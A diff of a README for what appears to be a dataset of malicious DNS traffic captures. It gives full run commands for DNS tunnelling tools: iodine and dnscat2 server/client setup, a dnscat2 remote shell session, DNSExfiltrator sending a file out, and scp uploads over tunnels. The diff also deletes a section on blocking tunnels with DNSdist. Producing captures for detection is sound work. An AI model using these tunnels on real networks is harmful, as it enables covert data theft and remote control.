@@ -28,14 +28,13 @@ It can be used to extract data silently from a corporate network.
 ### Iodine
 
 Tunnel IPv4 data over DNS
-
-Github URL: https://github.com/yarrick/iodine
-Qtype DNS used: NULL, PRIVATE, MX, CNAME and TXT
-Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/iodine.pcap
+- Github URL: https://github.com/yarrick/iodine
+- Qtype DNS used: NULL, PRIVATE, MX, CNAME and TXT
+- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/iodine.pcap
 
 Run server side
 
-```
+```bash
 sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest server -f 10.0.0.1 tun.example.com
 Enter tunnel password: 
 Opened dns0
@@ -48,7 +47,7 @@ Listening to dns for domain tun.example.com
 
 Run client
 
-```
+```bash
 sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest client -f -r 8.8.8.8 tun.example.com
 Enter tunnel password: 
 Opened dns0
@@ -75,7 +74,7 @@ Connection setup complete, transmitting data.
 
 Upload a local file to remote side
 
-```
+```bash
 $ sudo scp /tmp/wireshark_wlp2s0IJSF71.pcapng root@10.0.0.1:/tmp
 The authenticity of host '10.0.0.1 (10.0.0.1)' can't be established.
 ED25519 key fingerprint is SHA256:n1Tj0bCqHpZswnjP92E33SoCQL4nj3pRKwS1qHB2RqY.
@@ -88,13 +87,14 @@ wireshark_wlp2s0IJSF71.pcapng                   36% 3504KB 304.9KB/s   00:19 ETA
 
 ### DNSCat2
 
+Resume:
 - Github URL: https://github.com/iagox86/dnscat2
 - Qtype DNS used: TXT, CNAME, MX
 - Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dnscat2.pcap
 
 Run server side
 
-```
+```bash
 # sudo docker run -p 53:53/udp -it --rm dmachard/dnscat2:latest server biillpi.com
 
 New window created: 0
@@ -125,7 +125,7 @@ dnscat2>
 
 Run client
 
-```
+```bash
 $ sudo docker run -it --rm dmachard/dnscat2:latest client --secret=e9829a2263f0c5ca10c8024dd551691f biillpi.com
 Creating DNS driver:
  domain = biillpi.com
@@ -141,7 +141,7 @@ Session established!
 
 Open a remote shell from server
 
-```
+```bash
 dnscat2> session -i 2
 
 command (1535f3a093f8) 2> shell
@@ -169,9 +169,10 @@ sh (1535f3a093f8) 3> ls -alrt
 
 ### dns2tcp
 
-Github URL: https://github.com/alex-sector/dns2tcp
-Qtype DNS used: TXT, KEY 
-Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap
+Resume:
+- Github URL: https://github.com/alex-sector/dns2tcp
+- Qtype DNS used: TXT, KEY 
+- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap
 
 Compilation
 
@@ -236,9 +237,10 @@ scp -P 4430 /myfile.txt root@127.0.0.1:/tmp
 
 ### DNSExfiltrator
 
-Github URL: https://github.com/Arno0x/DNSExfiltrator
-Qtype DNS used: TXT
-Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap
+Resume:
+- Github URL: https://github.com/Arno0x/DNSExfiltrator
+- Qtype DNS used: TXT
+- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap
 
 Start the server
 
@@ -267,9 +269,10 @@ C:\Users\>dnsExfiltrator.exe Installer.exe hsc.fr password -b32 s=192.168.1.210
 
 ### Sods
 
-Github URL: https://github.com/msantos/sods
-Qtype DNS used: TXT, CNAME and NULL
-Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/sods.pcap
+Resume:
+- Github URL: https://github.com/msantos/sods
+- Qtype DNS used: TXT, CNAME and NULL
+- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/sods.pcap
 
 ```bash
 sudo groupadd nogroup
@@ -300,12 +303,3 @@ ssh root@localhost
 - https://github.com/mdornseif/DeNiSe
 - https://code.google.com/archive/p/dnscapy/
 - https://github.com/BishopFox/sliver
-
-## Blocking approach with DNSdist
-
-The approach:
-- Uncommon DNS Qtype like NULL, PRIVATE are blocked
-- A generic regex to block long successive DNS label with whitelist to avoid false-positive
-- Then finally apply some rate limitation per IP
-
-This configuration can be downloaded here https://github.com/dmachard/lua-dnsdist-config-examples/blob/main/security_blocking_dnstunneling.lua
